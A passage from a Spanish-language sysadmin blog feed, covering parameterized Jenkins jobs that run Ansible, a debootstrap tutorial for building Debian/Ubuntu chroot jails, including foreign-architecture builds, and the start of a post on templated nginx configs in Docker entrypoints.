&lt;p&gt;Vamos a crear una tarea que consista en lanzar el fichero &lt;em&gt;playbooks/ping_all.yml&lt;/em&gt;. Para ello pinchamos en el enlace "create new job", le damos un nombre (por ejemplo "Ping All") y lo creamos de tipo "Freestyle project".&lt;/p&gt;
&lt;p&gt;El primer paso consiste en obtener los &lt;em&gt;playbooks&lt;/em&gt; del repositorio. Para ello rellenaremos el apartado "Source code management", eligiendo "Git" e indicando la &lt;em&gt;URL&lt;/em&gt; del repositorio.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Ansible desde Jenkins 02" src="http://www.linuxsysadmin.ml/images/ansible_jenkins_02.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Lo siguiente es indicar un "Build step" que se "Invoke Ansible Playbook". Hay que indicar el &lt;em&gt;playbook&lt;/em&gt; desde la carpeta pertinente, de forma relativa. Eso significa que en nuestro caso es &lt;em&gt;playbooks/ping_all.yml&lt;/em&gt;. Adicionalmente vamos a indicar que el fichero de inventario es la carpeta &lt;em&gt;inventory&lt;/em&gt;, que es lo que se le va a pasar a &lt;strong&gt;Ansible&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Ansible desde Jenkins 03" src="http://www.linuxsysadmin.ml/images/ansible_jenkins_03.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Le damos a guardar y ya tenemos nuestra tarea. Bastará con lanzar la tarea con "Build now" y esperar resultados, en "Console Output" de la ejecución en curso.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Ansible desde Jenkins 04" src="http://www.linuxsysadmin.ml/images/ansible_jenkins_04.jpg"&gt;&lt;/p&gt;
&lt;h2&gt;Creando una tarea con parámetros&lt;/h2&gt;
&lt;p&gt;Muchas de las tareas que hacemos son repetitivas. Cambian las versiones de código a desplegar, los entornos, los proyectos y poco mas. ¿No sería maravilloso tener un solo &lt;em&gt;playbook&lt;/em&gt; que admita parámetros? &lt;strong&gt;Jenkins&lt;/strong&gt; nos ofrece la posibilidad de añadir parámetros, que luego pueden ser usados en los "Build steps", por ejemplo, para pasárselas a los &lt;em&gt;playbooks&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Vamos a crear otra tarea, esta vez llamada "Ping Some". Va a ser idéntica a la otra, pero con el &lt;em&gt;playbook&lt;/em&gt; llamado &lt;em&gt;ping_some.yml&lt;/em&gt;. Vamos a marcar la casilla "This project is parameterized" en la casilla general y le añadiremos un parámetro, al que llamaremos "target" y va a ser un "Choice Parameter" con los valores "all", "group1" y "group2".&lt;/p&gt;
&lt;p&gt;&lt;img alt="Ansible desde Jenkins 05" src="http://www.linuxsysadmin.ml/images/ansible_jenkins_05.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Vamos a los "Build steps" a poner ese parámetro al comando &lt;em&gt;ansible&lt;/em&gt;. Tras dar al botón "Advanced..." podemos poner mas parámetros para &lt;strong&gt;Ansible&lt;/strong&gt;. Esto nos permite poner "-e target=$target" para que el &lt;em&gt;playbook&lt;/em&gt; reciba un parámetro &lt;em&gt;target&lt;/em&gt; que contenga el valor del mismo parámetro en &lt;strong&gt;Jenkins&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Ansible desde Jenkins 06" src="http://www.linuxsysadmin.ml/images/ansible_jenkins_06.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Tras salvar la tarea, vemos que la opción de "Build" se ha convertido en "Build with Parameters", y podemos elegir entre los valores específicos.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Ansible desde Jenkins 07" src="http://www.linuxsysadmin.ml/images/ansible_jenkins_07.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Y con esto conseguimos pasar parámetros al &lt;em&gt;playbook&lt;/em&gt;, que pueden ser texto libre, elecciones simples o valores fijos. Con un poco de imaginación, estos parámetros nos pueden ayudar mucho, en el sentido de no repetirnos.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Ansible desde Jenkins 08" src="http://www.linuxsysadmin.ml/images/ansible_jenkins_08.jpg"&gt;&lt;/p&gt;</content><category term="ansible"></category><category term="playbook"></category><category term="jenkins"></category><category term="docker"></category><category term="git"></category></entry><entry><title>Crear jaulas de forma fácil basadas en Debian y Ubuntu con debootstrap</title><link href="http://www.linuxsysadmin.ml/2016/09/crear-jaulas-de-forma-facil-basadas-en-debian-y-ubuntu-con-debootstrap.html" rel="alternate"></link><published>2016-09-19T08:00:00+02:00</published><updated>2016-09-19T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-09-19:/2016/09/crear-jaulas-de-forma-facil-basadas-en-debian-y-ubuntu-con-debootstrap.html</id><summary type="html">&lt;p&gt;Cuando creamos jaulas nos enfrentamos siempre al mismo dilema: usar una imagen de dudoso origen o perder nuestro tiempo investigando y buscando librerías que falten. Sin embargo, hay una forma mejor, que es descargar un sistema básico con herramientas oficiales que nos van a dar hasta un gestor de paquetes …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando creamos jaulas nos enfrentamos siempre al mismo dilema: usar una imagen de dudoso origen o perder nuestro tiempo investigando y buscando librerías que falten. Sin embargo, hay una forma mejor, que es descargar un sistema básico con herramientas oficiales que nos van a dar hasta un gestor de paquetes.&lt;/p&gt;
&lt;p&gt;Hay algunas distribuciones que nos ofrecen herramientas para descargar un sistema base a partir de sus repositorios, y que a menudo son la base de sus propias instalaciones. En el caso de las distribuciones &lt;strong&gt;Debian&lt;/strong&gt; y derivadas (&lt;strong&gt;Ubuntu&lt;/strong&gt;, &lt;strong&gt;Knoppix&lt;/strong&gt;, ...) esta herramienta se llama &lt;strong&gt;debootstrap&lt;/strong&gt; y de uso bastante sencillo.&lt;/p&gt;
&lt;p&gt;De hecho, otras herramientas parten de estas herramientas para usar como base para las suyas. Un ejemplo serían las imágenes de &lt;strong&gt;docker&lt;/strong&gt;, que no son mas que el resultado de la ejecución de &lt;strong&gt;debootstrap&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Este tutorial se ha ejecutado en un contenedor &lt;strong&gt;docker&lt;/strong&gt; de usar y tirar, para no polucionar mi máquina con herramientas innecesarias. También se asume que se dispone de la herramienta instalada que, por si no la tuvierais, se instala así:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@8e7b4f301aa0:~# apt-get install debootstrap
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following extra packages will be installed:
  ca-certificates libffi6 libgmp10 libgnutls-deb0-28 libhogweed2 libicu52 libidn11 libnettle4 libp11-kit0 libpsl0 libssl1.0.0 libtasn1-6 openssl wget
Suggested packages:
  gnutls-bin
The following NEW packages will be installed:
  ca-certificates debootstrap libffi6 libgmp10 libgnutls-deb0-28 libhogweed2 libicu52 libidn11 libnettle4 libp11-kit0 libpsl0 libssl1.0.0 libtasn1-6 openssl wget
&lt;span class="m"&gt;0&lt;/span&gt; upgraded, &lt;span class="m"&gt;15&lt;/span&gt; newly installed, &lt;span class="m"&gt;0&lt;/span&gt; to remove and &lt;span class="m"&gt;0&lt;/span&gt; not upgraded.
Need to get &lt;span class="m"&gt;10&lt;/span&gt;.8 MB of archives.
After this operation, &lt;span class="m"&gt;39&lt;/span&gt;.1 MB of additional disk space will be used.
Do you want to &lt;span class="k"&gt;continue&lt;/span&gt;? &lt;span class="o"&gt;[&lt;/span&gt;Y/n&lt;span class="o"&gt;]&lt;/span&gt; y
...
root@8e7b4f301aa0:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esta herramienta viene acompañada de los diferentes &lt;em&gt;scripts&lt;/em&gt; que conocen la forma de llegar al resultado deseado. Cabe remarcar que cuando mas reciente es la versión, mas &lt;em&gt;scripts&lt;/em&gt; lleva incorporados. En mi caso, usé &lt;strong&gt;Debian Jessie&lt;/strong&gt;, que como podéis ver, sabe construir &lt;strong&gt;Ubuntu 9.10 (Karmic Koala)&lt;/strong&gt;, pero no &lt;strong&gt;Ubuntu 16.04 (Xenial Xerus)&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@8e7b4f301aa0:~# dpkg -L debootstrap &lt;span class="p"&gt;|&lt;/span&gt; grep scripts
/usr/share/debootstrap/scripts
/usr/share/debootstrap/scripts/hoary
/usr/share/debootstrap/scripts/woody.buildd
/usr/share/debootstrap/scripts/feisty
/usr/share/debootstrap/scripts/warty.buildd
/usr/share/debootstrap/scripts/potato
/usr/share/debootstrap/scripts/sarge.fakechroot
/usr/share/debootstrap/scripts/hoary.buildd
/usr/share/debootstrap/scripts/gutsy
/usr/share/debootstrap/scripts/warty
/usr/share/debootstrap/scripts/sarge
/usr/share/debootstrap/scripts/sid
/usr/share/debootstrap/scripts/sarge.buildd
/usr/share/debootstrap/scripts/edgy
/usr/share/debootstrap/scripts/dapper
/usr/share/debootstrap/scripts/breezy
/usr/share/debootstrap/scripts/woody
/usr/share/debootstrap/scripts/saucy
/usr/share/debootstrap/scripts/testing
/usr/share/debootstrap/scripts/unstable
/usr/share/debootstrap/scripts/oneiric
/usr/share/debootstrap/scripts/stretch
/usr/share/debootstrap/scripts/stable
/usr/share/debootstrap/scripts/etch-m68k
/usr/share/debootstrap/scripts/maverick
/usr/share/debootstrap/scripts/raring
/usr/share/debootstrap/scripts/lenny
/usr/share/debootstrap/scripts/hardy
/usr/share/debootstrap/scripts/wheezy
/usr/share/debootstrap/scripts/squeeze
/usr/share/debootstrap/scripts/etch
/usr/share/debootstrap/scripts/oldstable
/usr/share/debootstrap/scripts/precise
/usr/share/debootstrap/scripts/trusty
/usr/share/debootstrap/scripts/utopic
/usr/share/debootstrap/scripts/natty
/usr/share/debootstrap/scripts/jaunty
/usr/share/debootstrap/scripts/jessie
/usr/share/debootstrap/scripts/lucid
/usr/share/debootstrap/scripts/intrepid
/usr/share/debootstrap/scripts/quantal
/usr/share/debootstrap/scripts/karmic
/usr/share/debootstrap/scripts/vivid
root@8e7b4f301aa0:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Para ejecutar &lt;strong&gt;debootstrap&lt;/strong&gt; en un contenedor &lt;strong&gt;docker&lt;/strong&gt; (de usar y tirar, por ejemplo), hace falta correr el contenedor con un &lt;em&gt;flag&lt;/em&gt; especial: &lt;em&gt;--privileged&lt;/em&gt;. Esto es debido a que &lt;strong&gt;debootstrap&lt;/strong&gt; intenta montar el sistema de ficheros &lt;em&gt;/proc&lt;/em&gt; y no dispone de permisos para hacerlo en circunstancias normales.&lt;/p&gt;
&lt;h2&gt;Un ejemplo de uso básico&lt;/h2&gt;
&lt;p&gt;A priori, este comando solo necesita saber la distribución que queremos descargar y la carpeta donde lo queremos hacer.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@8e7b4f301aa0:~# debootstrap jessie jail
...
root@8e7b4f301aa0:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos contar con varios &lt;em&gt;flags&lt;/em&gt; que van a modificar ligeramente su comportamiento. A lo largo del tutorial vamos a utilizar el &lt;em&gt;flag --variant=minbase&lt;/em&gt; que va a descargar menos paquetes todavía, acelerando su ejecución. Yo suelo usar siempre este &lt;em&gt;flag&lt;/em&gt;, porque al instalar con &lt;em&gt;apt-get&lt;/em&gt; otros paquetes, ya se incorporarían las dependencias.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@8e7b4f301aa0:~# debootstrap --variant&lt;span class="o"&gt;=&lt;/span&gt;minbase jessie jail 
I: Retrieving Release 
I: Retrieving Release.gpg 
I: Checking Release signature
I: Valid Release signature &lt;span class="o"&gt;(&lt;/span&gt;key id 75DDC3C4A499F1A18CB5F3C8CBF8D6FD518E17E1&lt;span class="o"&gt;)&lt;/span&gt;
I: Retrieving Packages 
I: Validating Packages 
I: Resolving dependencies of required packages...
I: Resolving dependencies of base packages...
I: Found additional required dependencies: acl adduser dmsetup insserv libaudit-common libaudit1 libbz2-1.0 libcap2 libcap2-bin libcryptsetup4 libdb5.3 libdebconfclient0 libdevmapper1.02.1 libgcrypt20 libgpg-error0 libkmod2 libncursesw5 libprocps3 libsemanage-common libsemanage1 libslang2 libsystemd0 libudev1 libustr-1.0-1 procps systemd systemd-sysv udev 
I: Found additional base dependencies: debian-archive-keyring gnupg gpgv libapt-pkg4.12 libreadline6 libstdc++6 libusb-0.1-4 readline-common 
I: Checking component main on http://ftp.us.debian.org/debian...
...
I: Base system installed successfully.
root@8e7b4f301aa0:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras ejecutar el comando, podemos ver que tenemos una carpeta &lt;em&gt;jail/&lt;/em&gt; en donde podemos encontrar un sistema &lt;strong&gt;Linux&lt;/strong&gt; bastante estándar, que corresponde con la distribución &lt;strong&gt;Debian Jessie&lt;/strong&gt; pedida.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@8e7b4f301aa0:~# ls -1 jail/
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
root@8e7b4f301aa0:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vemos que la instalación es bastante básica y tiene un tamaño reducido, ya que solo lleva lo mas básico, sin &lt;em&gt;kernel&lt;/em&gt; y sin &lt;em&gt;bootloader&lt;/em&gt;. Por no llevar, no lleva ni &lt;strong&gt;nano&lt;/strong&gt; ni &lt;strong&gt;vi&lt;/strong&gt;, por ejemplo. Usad &lt;em&gt;apt-get&lt;/em&gt; para instalar los paquetes que veáis necesarios, una vez dentro de la jaula.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@8e7b4f301aa0:~# du -sh jail/
202M    jail/
root@8e7b4f301aa0:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De hecho, mucho de lo que hay en la jaula son ficheros de &lt;em&gt;apt-get&lt;/em&gt;, que sirven para acelerar la operación normal de estas herramientas, pero que resultan inútiles si queremos una imagen mínima. Son ficheros que vuelven a aparecer con el uso normal de &lt;em&gt;apt-get&lt;/em&gt; y que van cambiando con el tiempo. Como se trata de la caché de paquetes descargados y de los índices de los repositorios, nos los cargamos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@8e7b4f301aa0:~# chroot jail/ apt-get clean
root@8e7b4f301aa0:~# rm -rf jail/var/lib/apt/lists/*
root@8e7b4f301aa0:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esto libera un 33% del espacio ocupado. Ahora sería un buen momento para sacar un fichero comprimido para guardar la imagen.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@8e7b4f301aa0:~# du -sh jail/
136M    jail/
root@8e7b4f301aa0:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Si la carpeta &lt;em&gt;jail/&lt;/em&gt; estuviera mapeada a un dispositivo tendríamos un disco de sistema operativo casi completo. Bastaría con instalarle un &lt;em&gt;kernel&lt;/em&gt; y un &lt;em&gt;bootloader&lt;/em&gt; para tener un sistema operativo funcional.&lt;/p&gt;
&lt;h2&gt;Haciendo un fichero comprimido de paquetes descargados&lt;/h2&gt;
&lt;p&gt;Si la idea de ir copiando la jaula anterior no nos convence, podemos tener los paquetes &lt;em&gt;.deb&lt;/em&gt; descargados y comprimidos en un fichero &lt;em&gt;.tar.gz&lt;/em&gt;, para no tener que descargar todos los paquetes cada vez. Basta con poner el &lt;em&gt;flag --make-tarball&lt;/em&gt;. En este caso, la carpeta de descarga es una carpeta temporal, que va a ser eliminada al terminar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@8e7b4f301aa0:~# debootstrap --variant&lt;span class="o"&gt;=&lt;/span&gt;minbase --make-tarball&lt;span class="o"&gt;=&lt;/span&gt;debian-jessie.tgz jessie temporal
I: Retrieving Release 
I: Retrieving Release.gpg 
I: Checking Release signature
I: Valid Release signature &lt;span class="o"&gt;(&lt;/span&gt;key id 75DDC3C4A499F1A18CB5F3C8CBF8D6FD518E17E1&lt;span class="o"&gt;)&lt;/span&gt;
I: Retrieving Packages 
I: Validating Packages 
I: Resolving dependencies of required packages...
I: Resolving dependencies of base packages...
I: Found additional required dependencies: acl adduser dmsetup insserv libaudit-common libaudit1 libbz2-1.0 libcap2 libcap2-bin libcryptsetup4 libdb5.3 libdebconfclient0 libdevmapper1.02.1 libgcrypt20 libgpg-error0 libkmod2 libncursesw5 libprocps3 libsemanage-common libsemanage1 libslang2 libsystemd0 libudev1 libustr-1.0-1 procps systemd systemd-sysv udev 
I: Found additional base dependencies: debian-archive-keyring gnupg gpgv libapt-pkg4.12 libreadline6 libstdc++6 libusb-0.1-4 readline-common 
I: Checking component main on http://ftp.us.debian.org/debian...
...
I: Deleting target directory
root@8e7b4f301aa0:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente obtenemos nuestro fichero comprimido, que es mas fácil de copiar a diferentes máquinas, por tamaño y por velocidad de transmisión.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@8e7b4f301aa0:~# du -sh debian-jessie.tgz 
43M debian-jessie.tgz
root@8e7b4f301aa0:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Este fichero contiene solamente los ficheros que descartamos al final del proceso, que son los &lt;em&gt;.deb&lt;/em&gt; ya instalados y los índices del repositorio.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@8e7b4f301aa0:~# tar tf debian-jessie.tgz &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="se"&gt;\/&lt;/span&gt;$
var/lib/apt/
var/lib/apt/lists/
var/lib/apt/lists/partial/
var/cache/apt/
var/cache/apt/archives/
var/cache/apt/archives/partial/
root@8e7b4f301aa0:~# tar tf debian-jessie.tgz &lt;span class="p"&gt;|&lt;/span&gt; head
var/lib/apt/
var/lib/apt/lists/
var/lib/apt/lists/debootstrap.invalid_dists_jessie_main_binary-amd64_Packages
var/lib/apt/lists/debootstrap.invalid_dists_jessie_Release.gpg
var/lib/apt/lists/partial/
var/lib/apt/lists/debootstrap.invalid_dists_jessie_Release
var/cache/apt/
var/cache/apt/archives/
var/cache/apt/archives/libbz2-1.0_1.0.6-7+b3_amd64.deb
var/cache/apt/archives/bash_4.3-11+b1_amd64.deb
root@8e7b4f301aa0:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Cuando queramos utilizar este fichero comprimido para crear una jaula, basta con indicar que use los paquetes en el fichero, mediante el &lt;em&gt;flag --unpack-tarball&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@8e7b4f301aa0:~# debootstrap --variant&lt;span class="o"&gt;=&lt;/span&gt;minbase --unpack-tarball&lt;span class="o"&gt;=&lt;/span&gt;/root/debian-jessie.tgz jessie rootfs
I: Retrieving Release 
I: Retrieving Release.gpg 
I: Checking Release signature
I: Valid Release signature &lt;span class="o"&gt;(&lt;/span&gt;key id 75DDC3C4A499F1A18CB5F3C8CBF8D6FD518E17E1&lt;span class="o"&gt;)&lt;/span&gt;
I: Validating Packages 
I: Resolving dependencies of required packages...
I: Resolving dependencies of base packages...
I: Found additional required dependencies: acl adduser dmsetup insserv libaudit-common libaudit1 libbz2-1.0 libcap2 libcap2-bin libcryptsetup4 libdb5.3 libdebconfclient0 libdevmapper1.02.1 libgcrypt20 libgpg-error0 libkmod2 libncursesw5 libprocps3 libsemanage-common libsemanage1 libslang2 libsystemd0 libudev1 libustr-1.0-1 procps systemd systemd-sysv udev 
I: Found additional base dependencies: debian-archive-keyring gnupg gpgv libapt-pkg4.12 libreadline6 libstdc++6 libusb-0.1-4 readline-common 
I: Checking component main on http://ftp.us.debian.org/debian...
...
I: Base system installed successfully.
root@8e7b4f301aa0:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Este proceso sigue necesitando de conexión a internet, porque consulta al índice del repositorio para saber que paquetes necesita. Sin embargo, estos paquetes ya los tenemos, con lo que es un proceso bastante mas rápido y menos estresante para nuestra red.&lt;/p&gt;
&lt;h2&gt;Construyendo una jaula para otra máquina&lt;/h2&gt;
&lt;p&gt;Supongamos ahora que tenemos una máquina que es de otra arquitectura y le descargamos el sistema de ficheros en nuestro local. Normalmente no sería posible ya que podemos descargar los ficheros &lt;em&gt;.deb&lt;/em&gt; de la otra arquitectura, pero no podemos configurar los paquetes porque para esto se necesita ejecutar binarios que, por supuesto, no funcionan en nuestro local.&lt;/p&gt;
&lt;p&gt;El comando &lt;strong&gt;debootstrap&lt;/strong&gt; también nos permite esto. La idea está en "dejar listo" una estructura, de forma que solo haga falta copiar en destino y configurar los paquetes. Esto es tan fácil como indicar el &lt;em&gt;flag --foreign&lt;/em&gt;, y adicionalmente, indicar la arquitectura deseada con &lt;em&gt;--arch&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@8e7b4f301aa0:~# debootstrap --variant&lt;span class="o"&gt;=&lt;/span&gt;minbase --arch&lt;span class="o"&gt;=&lt;/span&gt;armhf --foreign jessie rootfs
I: Retrieving Release 
I: Retrieving Release.gpg 
I: Checking Release signature
I: Valid Release signature &lt;span class="o"&gt;(&lt;/span&gt;key id 75DDC3C4A499F1A18CB5F3C8CBF8D6FD518E17E1&lt;span class="o"&gt;)&lt;/span&gt;
I: Retrieving Packages 
I: Validating Packages 
I: Resolving dependencies of required packages...
I: Resolving dependencies of base packages...
I: Found additional required dependencies: acl adduser dmsetup insserv libaudit-common libaudit1 libbz2-1.0 libcap2 libcap2-bin libcryptsetup4 libdb5.3 libdebconfclient0 libdevmapper1.02.1 libgcrypt20 libgpg-error0 libkmod2 libncursesw5 libprocps3 libsemanage-common libsemanage1 libslang2 libsystemd0 libudev1 libustr-1.0-1 procps systemd systemd-sysv udev 
I: Found additional base dependencies: debian-archive-keyring gnupg gpgv libapt-pkg4.12 libreadline6 libstdc++6 libusb-0.1-4 readline-common 
I: Checking component main on http://ftp.us.debian.org/debian...
...
root@8e7b4f301aa0:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esto nos deja un sistema "a medias", con un &lt;em&gt;script&lt;/em&gt; que nos permita continuar a partir de este punto, una vez hayamos copiado la estructura generada en destino.&lt;/p&gt;
&lt;p&gt;Si miramos el sistema de ficheros, veremos que se trata de la jaula casi acabada, con una carpeta &lt;em&gt;debootstrap/&lt;/em&gt; que contiene lo necesario para continuar, incluido el &lt;em&gt;script&lt;/em&gt; llamado &lt;em&gt;debootstrap&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@8e7b4f301aa0:~# ls rootfs/debootstrap/
arch  base  debootstrap  debootstrap.log  debpaths  devices.tar.gz  functions  required  suite  suite-script  variant
root@8e7b4f301aa0:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para continuar el proceso en la nueva máquina, tenemos que copiar en ella toda la carpeta &lt;em&gt;rootfs/&lt;/em&gt;. Solo nos quedará usar &lt;em&gt;chroot&lt;/em&gt; para entrar en la jaula y ejecutar el &lt;em&gt;script&lt;/em&gt; para configurar lo que falte y eliminar las herramientas intermedias. Este proceso no requiere conexión a internet.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@odroid:~# chroot rootfs/
&lt;span class="c1"&gt;# /debootstrap/debootstrap --second-stage&lt;/span&gt;
I: Keyring file not available at /usr/share/keyrings/debian-archive-keyring.gpg&lt;span class="p"&gt;;&lt;/span&gt; switching to https mirror https://mirrors.kernel.org/debian
I: Installing core packages...
I: Unpacking required packages...
...
I: Base system installed successfully.
&lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y finalmente podemos disfrutar de nuestra jaula en la nueva máquina.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# ls&lt;/span&gt;
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
&lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="debian"></category><category term="ubuntu"></category><category term="debootstrap"></category><category term="jaula"></category></entry><entry><title>Imágenes docker reusables mediante configuraciones dinámicas</title><link href="http://www.linuxsysadmin.ml/2016/09/imagenes-docker-reusables-mediante-configuraciones-dinamicas.html" rel="alternate"></link><published>2016-09-12T08:00:00+02:00</published><updated>2016-09-12T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-09-12:/2016/09/imagenes-docker-reusables-mediante-configuraciones-dinamicas.html</id><summary type="html">&lt;p&gt;Muchos de los servicios que necesitamos son siempre los mismos, cambiando solamente algunos parámetros. Incluso los mismos servicios pueden sufrir variaciones en su configuración, por ejemplo, un balanceador al que se añaden o quitan &lt;em&gt;hosts&lt;/em&gt;. Siguiendo las prácticas de &lt;a href="http://12factor.net/es/"&gt;12factor&lt;/a&gt; podemos ahorrar trabajo, mediante el uso de variables de entorno …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Muchos de los servicios que necesitamos son siempre los mismos, cambiando solamente algunos parámetros. Incluso los mismos servicios pueden sufrir variaciones en su configuración, por ejemplo, un balanceador al que se añaden o quitan &lt;em&gt;hosts&lt;/em&gt;. Siguiendo las prácticas de &lt;a href="http://12factor.net/es/"&gt;12factor&lt;/a&gt; podemos ahorrar trabajo, mediante el uso de variables de entorno.&lt;/p&gt;
&lt;p&gt;El problema es que las variables de entorno no siempre son bienvenidas en las configuraciones de una aplicación, siendo mucho mas comunes los ficheros con un formato concreto. Eso significa que necesitamos varias imágenes &lt;strong&gt;docker&lt;/strong&gt; para los diferentes proyectos y entornos.&lt;/p&gt;
&lt;p&gt;Harto de escribir configuraciones &lt;strong&gt;nginx&lt;/strong&gt; y reconstruir la imagen cada vez que añadíamos &lt;em&gt;hosts&lt;/em&gt;, me hice la pregunta: ¿Hay alguna forma mas inteligente de hacer esto?&lt;/p&gt;
&lt;p&gt;La única forma de cambiar el contenido de una imagen &lt;strong&gt;docker&lt;/strong&gt; es mapeando las configuraciones en volúmenes o mediante el uso de variables de entorno. Pero &lt;strong&gt;nginx&lt;/strong&gt; no admite variables de entorno, y lo de los volúmenes me parece una chapuza.&lt;/p&gt;
&lt;p&gt;La solución es tan simple como efectiva: generar las configuraciones estáticas de forma dinámica. La idea es pasar las variables de entorno al contenedor, y que antes de ejecutar su servicio, genere la configuración a partir de las variables recibidas. Un ejercicio de &lt;em&gt;templating&lt;/em&gt; básico.&lt;/p&gt;
&lt;h2&gt;Un ejemplo: un balanceador con nginx con backends variables.&lt;/h2&gt;
&lt;p&gt;El esquema de un balanceador en &lt;strong&gt;nginx&lt;/strong&gt; sigue siempre el mismo patrón:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;upstream&lt;/span&gt; &lt;span class="s"&gt;backend&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kn"&gt;...&lt;/span&gt;
&lt;span class="err"&gt;}&lt;/span&gt;

&lt;span class="s"&gt;server&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kn"&gt;listen&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kn"&gt;server_name&lt;/span&gt; &lt;span class="s"&gt;_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="kn"&gt;location&lt;/span&gt; &lt;span class="s"&gt;/&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="kn"&gt;proxy_pass&lt;/span&gt; &lt;span class="s"&gt;http://backend&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El truco consiste en que el contenedor va a ejecutar un &lt;em&gt;script&lt;/em&gt; que va a generar la configuración y va a lanzar nuestro binario. Para hacerlo limpiamente, vamos a separar la ejecución, del &lt;em&gt;script&lt;/em&gt; de generación.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/dynamic_configs$ cat entrypoint.sh 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

./config.sh &amp;gt; /etc/nginx/conf.d/balancer
&lt;span class="nb"&gt;exec&lt;/span&gt; /usr/sbin/nginx -g &lt;span class="s2"&gt;&amp;quot;daemon off;&amp;quot;&lt;/span&gt;
gerard@sirius:~/docker/dynamic_configs$ 
&lt;/pre&gt;&lt;/div&gt;


